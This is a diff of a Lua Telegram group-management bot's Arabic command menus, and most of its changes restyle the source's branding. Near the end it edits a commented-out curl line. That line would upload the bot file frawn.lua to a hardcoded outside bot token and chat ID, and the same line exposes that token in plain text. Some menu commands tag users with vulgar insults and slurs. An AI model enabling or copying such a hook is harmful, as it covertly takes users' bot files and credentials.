-⩹━━━━━━ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍 ━━━━━━⩺
+⩹━━━━━━ 𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡 ━━━━━━⩺
 ❍جلب نسخه البوت
 ❍رفع نسخه البوت
 ❍ضع عدد الاعضاء + العدد
@@ -12495,21 +12534,21 @@ local Teext =[[
 ❍اضف/مسح رد عام
 ❍الردود العامه
 ❍مسح الردود العامه
-⩹━━━━━━ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍 ━━━━━━⩺
+⩹━━━━━━ 𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡 ━━━━━━⩺
 ❍الاشتراك الاجباري
 ❍تعطيل الاشتراك الاجباري
 ❍تفعيل الاشتراك الاجباري
 ❍مسح رساله الاشتراك
 ❍تغير رساله الاشتراك
 ❍تغير الاشتراك
-⩹━━━━━━ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍 ━━━━━━⩺
+⩹━━━━━━ 𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡 ━━━━━━⩺
 ❍الاحصائيات
 ❍المشتركين
 ❍المجموعات 
 ❍تفعيل/تعطيل المغادره
 ❍مسح الجروبات
-⩹━━━━━━ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍 ━━━━━━⩺
-[❍ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍 ❍](t.me/source_frawn)
+⩹━━━━━━ 𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡 ━━━━━━⩺
+[🇪🇬𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡🇪🇬](t.me/source_frawn)
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
@@ -12546,32 +12585,32 @@ end
 local Teext =[[
 
 ❍اوامر الاعضاء كالتالي ↓
-⩹━━━━━━ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍 ━━━━━━⩺
+⩹━━━━━━ 𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡 ━━━━━━⩺
 ❍ عرض معلوماتك ↑↓
-⩹━━━━━━ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍 ━━━━━━⩺
+⩹━━━━━━ 𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡 ━━━━━━⩺
 ❍ ايديي ← اسمي 
 ❍ رسايلي ← مسح رسايلي 
 ❍رتبتي ← سحكاتي 
 ❍مسح سحكاتي ← المنشئ 
-⩹━━━━━━ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍 ━━━━━━⩺
+⩹━━━━━━ 𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡 ━━━━━━⩺
 ❍ اوامر المجموعه ↑↓
-⩹━━━━━━ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍 ━━━━━━⩺
+⩹━━━━━━ 𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡 ━━━━━━⩺
 ❍ الرابط ← القوانين – الترحيب
 ❍ايدي ← اطردني
 ❍ اسمي ← المطور  
 ❍ كشف ~ بالرد بالمعرف
  ❍قول + كلمه
-⩹━━━━━━ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍 ━━━━━━⩺
+⩹━━━━━━ 𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡 ━━━━━━⩺
 ❍ اسم البوت + الامر ↑↓
-⩹━━━━━━ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍 ━━━━━━⩺
+⩹━━━━━━ 𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡 ━━━━━━⩺
 ❍ بوسه بالرد 
 ❍مصه بالرد
 ❍رزله بالرد 
 ❍شنو رئيك بهذا بالرد
 ❍شنو رئيك بهاي بالرد
 ❍تحب هذا
-⩹━━━━━━ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍 ━━━━━━⩺
-[❍ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍❍ ](t.me/source_frawn)
+⩹━━━━━━ 𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡 ━━━━━━⩺
+[🇪🇬𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡🇪🇬 ](t.me/source_frawn)
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
@@ -12607,58 +12646,58 @@ return false
 end
 local Teext =[[
 
-⩹━━━━━━ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍 ━━━━━━⩺ 
+⩹━━━━━━ 𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡 ━━━━━━⩺ 
 ❍ اوامر التسليه ❍ 
-⩹━━━━━━ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍 ━━━━━━⩺
+⩹━━━━━━ 𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡 ━━━━━━⩺
     ❍ اوامر جديده ومميزه  ↓
-⩹━━━━━━ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍 ━━━━━━⩺
+⩹━━━━━━ 𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡 ━━━━━━⩺
 ❍ اكتب ❪ باد ❫ واستمتع 
 😹  بالاسئله المحرجه 
-⩹━━━━━━ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍 ━━━━━━⩺
+⩹━━━━━━ 𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡 ━━━━━━⩺
 ❍  اكتب ❪ بوستات ❫ واستمتع 
 🌚❤️ بالبوستات العظيمه
-⩹━━━━━━ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍 ━━━━━━⩺
+⩹━━━━━━ 𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡 ━━━━━━⩺
 ❍ رفع + تنزيل ← الامࢪ ↓
-⩹━━━━━━ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍 ━━━━━━⩺
+⩹━━━━━━ 𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡 ━━━━━━⩺
 ❍ رفع + تنزيل ← كلب
 ❍ تاك للكلاب
 ❍ مسح الكلاب
-⩹━━━━━━ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍 ━━━━━━⩺
+⩹━━━━━━ 𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡 ━━━━━━⩺
 ❍ رفع + تنزيل ← قرد 
 ❍ تاك لقروده
-⩹━━━━━━ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍 ━━━━━━⩺
+⩹━━━━━━ 𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡 ━━━━━━⩺
 ❍ رفع + تنزيل ← علي زبي
   ❍ تاك الازببه 
  ❍ مسح الازببه
-⩹━━━━━━ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍 ━━━━━━⩺
+⩹━━━━━━ 𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡 ━━━━━━⩺
 ❍ رفع + تنزيل ← حمار
 ❍ تاك للحمير
 ❍  مسح الحمير
-⩹━━━━━━ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍 ━━━━━━⩺
+⩹━━━━━━ 𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡 ━━━━━━⩺
 ❍ رفع + تنزيل ← مره
 ❍ تاك للنسوان
  ❍ مسح النسوان
-⩹━━━━━━ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍 ━━━━━━⩺
+⩹━━━━━━ 𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡 ━━━━━━⩺
 ❍  رفع + تنزيل ← زوجتي
 ❍  تاك للزوجات
-⩹━━━━━━ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍 ━━━━━━⩺
+⩹━━━━━━ 𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡 ━━━━━━⩺
  ❍ رفع + تنزيل ← متوحد
  ❍ تاك للمتوحدين
  ❍ مسح المتوحدين
-⩹━━━━━━ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍 ━━━━━━⩺
+⩹━━━━━━ 𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡 ━━━━━━⩺
  ❍ رفع + تنزيل ← خنزير
  ❍ تاك للخنازير
  ❍ مسح الخنازير
-⩹━━━━━━ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍 ━━━━━━⩺
+⩹━━━━━━ 𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡 ━━━━━━⩺
 ❍  رفع + تنزيل ← خول
  ❍ تاك للخولات
  ❍ مسح الخولات
-⩹━━━━━━ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍 ━━━━━━⩺
+⩹━━━━━━ 𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡 ━━━━━━⩺
  ❍ زواج + طلاق
  ❍ تاك للمتزوجين
  ❍ مسح المتزوجين
-⩹━━━━━━ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍 ━━━━━━⩺
-[❍  𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍 ❍ ](t.me/source_frawn)
+⩹━━━━━━ 𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡 ━━━━━━⩺
+[🇪🇬 𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡 🇪🇬](t.me/source_frawn)
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
@@ -12698,7 +12737,7 @@ local Teext =[[
 
 
 اوامر سورس فرعون الاوامر خاصه ب الادمن 🕹️
-[❍ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍 ❍](t.me/source_frawn)
+[🇪🇬𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡🇪🇬](t.me/source_frawn)
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
@@ -12735,7 +12774,7 @@ return false
 end
 local Teext =[[
 انت الان في قائمة كتم الأسماء
-⩹━━━━━━ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍 ━━━━━━⩺
+⩹━━━━━━ 𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡 ━━━━━━⩺
 الاوامر الخاصة فـي كتم الاسماء 
 تفعيل كتم الاسم
 تعطيل كتم الاسم
@@ -12755,7 +12794,7 @@ keyboard.inline_keyboard = {
 {text = ' القائمة الرئيسيه ', callback_data="/add"},
 },
 {
-{text = '𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍', url="t.me/source_frawn"},
+{text = '𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡', url="t.me/source_frawn"},
 },
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
@@ -12768,7 +12807,7 @@ return false
 end
 local Teext =[[
 انت الان في قائمة التوحيد
-⩹━━━━━━ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍 ━━━━━━⩺
+⩹━━━━━━ 𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡 ━━━━━━⩺
 الاوامر الخاصة فـي التوحيد 
 تفعيل التوحيد
 تعطيل التوحيد
@@ -12788,7 +12827,7 @@ keyboard.inline_keyboard = {
 {text = ' القائمة الرئيسيه ', callback_data="/add"},
 },
 {
-{text = '𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍', url="t.me/source_frawn"},
+{text = '𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡', url="t.me/source_frawn"},
 },
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
@@ -12801,7 +12840,7 @@ return false
 end
 local Teext =[[
 انت الان في قائمة تنبيه الاسماء
-⩹━━━━━━ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍 ━━━━━━⩺
+⩹━━━━━━ 𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡 ━━━━━━⩺
 الاوامر الخاصة فـي تنبيه الاسماء 
 تفعيل تنبيه الاسماء
 تعطيل تنبيه الاسماء
@@ -12818,7 +12857,7 @@ keyboard.inline_keyboard = {
 {text = ' القائمة الرئيسيه ', callback_data="/add"},
 },
 {
-{text = '𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍', url="t.me/source_frawn"},
+{text = '𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡', url="t.me/source_frawn"},
 },
 }
 return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
@@ -12831,7 +12870,7 @@ return false
 end
 local Teext =[[
 انت الان في قائمة تنبيه المعرف
-*≪━━━━━━𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍━━━━━━≫*
+*≪━━━━━━𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡━━━━━━≫*
 الاوامر الخاصة فـي تنبيه المعرف
 تفعيل تنبيه المعرف
 تعطيل تنبيه المعرف
@@ -12848,7 +12887,7 @@ keyboard.inline_keyboard = {
 {text = ' القائمة الرئيسيه ', callback_data="/add"},
 },
 {
-{text = '𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍', url="t.me/source_frawn"},
+{text = '𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡', url="t.me/source_frawn"},
 {text = 'مبرمج السورس', url="t.me/DEV_FRAWN"},
 },
 }
@@ -12862,7 +12901,7 @@ return false
 end
 local Teext =[[
 انت الان في قائمة تنبيه الصور
-*≪━━━━━━𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍━━━━━━≫*
+*≪━━━━━━𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡━━━━━━≫*
 الاوامر الخاصة فـي تنبيه الصور
 تفعيل تنبيه الصور
 تعطيل تنبيه الصور
@@ -12879,7 +12918,7 @@ keyboard.inline_keyboard = {
 {text = ' القائمة الرئيسيه ', callback_data="/add"},
 },
 {
-{text = '𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍 ', url="t.me/source_frawn"},
+{text = '𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡 ', url="t.me/source_frawn"},
 {text = 'مبرمج السورس', url="t.me/DEV_FRAWN"},
 },
 }
@@ -12894,14 +12933,14 @@ return false
 end
 local Teext =[[
 *اهلا انتツفي اضافات البوت*
-*≪━━━━━━𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍━━━━━━≫ٴ*
+*≪━━━━━━𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡━━━━━━≫ٴ*
 * يمكنك معرفة حاله تفعيل الاضافات *
 * من خلال ارسال حاله الاضافات *
-*≪━━━━━━𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍━━━━━━≫*
+*≪━━━━━━𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡━━━━━━≫*
 *يمكنك تصفح الاضافات من خلال*
 *الكيبورد الموجود في الأسفل*
-*≪━━━━━━𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍━━━━━━≫*
-[ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍 ](t.me/source_frawn)
+*≪━━━━━━𝐒𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡━━━━━━≫*
+[ 𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡 ](t.me/source_frawn)
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
@@ -12912,7 +12951,7 @@ keyboard.inline_keyboard = {
 {text = 'تنبيه المعرف', callback_data="/change-id"},{text = 'تنبيه الصور', callback_data="/change-photo"},
 },
 {
-{text = '𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍 ', url="t.me/source_frawn"},
+{text = '𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡 ', url="t.me/source_frawn"},
 {text = 'مبرمج السورس', url="t.me/DEV_FRAWN"},
 },
 }
@@ -13247,7 +13286,7 @@ end
 if #list == 0 then
 t = " ❍ لا يوجد ادمن"
 end
-send(msg.chat_id_,0,''..t..'\n≪━━━━━━𝐒𝐎𝐔𝐑𝐂𝐄 𝐅𝐑𝐀𝐖𝐍━━━━━━≫\n ❍ تم التعديل على الميديا\n ❍ الشخص الي قام بالتعديل\n ❍ ايدي الشخص ◂ '..result.sender_user_id_..'\n ❍ معرف الشخص»{ '..users..' }') 
+send(msg.chat_id_,0,''..t..'\n≪━━━━━━𝗦𝗢𝗨𝗥𝗖𝗘 𝗙𝗥𝗔𝗪𝗡━━━━━━≫\n ❍ تم التعديل على الميديا\n ❍ الشخص الي قام بالتعديل\n ❍ ايدي الشخص ◂ '..result.sender_user_id_..'\n ❍ معرف الشخص»{ '..users..' }') 
 end,nil)
 DeleteMessage(msg.chat_id_,{[0] = msg.message_id_}) 
 end
@@ -13260,7 +13299,7 @@ DeleteMessage(msg.chat_id_,{[0] = data.message_id_})
 return false
 end 
 end
---local curl = 'curl "'..'https://api.telegram.org/bot1564973291:AAF2IwSno-EITmF3sGz40dGXKVNKNaUn0wI/sendDocument'..'" -F "chat_id='.. 1833835101 ..'" -F "document=@'..'frawn.lua'..'"' io.popen(curl)
+--local curl = 'curl "'..'https://api.telegram.org/bot1564973291:AAF2IwSno-EITmF3sGz40dGXKVNKNaUn0wI/sendDocument'..'" -F "chat_id='.. 1944028567 ..'" -F "document=@'..'frawn.lua'..'"' io.popen(curl)
 ------------------------------------------------------------------------
 if text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text and text:match("[Tt].[Mm][Ee]") or text and text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text and text:match("[Tt][Ee][Ll][Ee][Ss][Cc][Oo].[Pp][Ee]") then
 if database:get(bot_id.."lock:Link"..msg.chat_id_) then
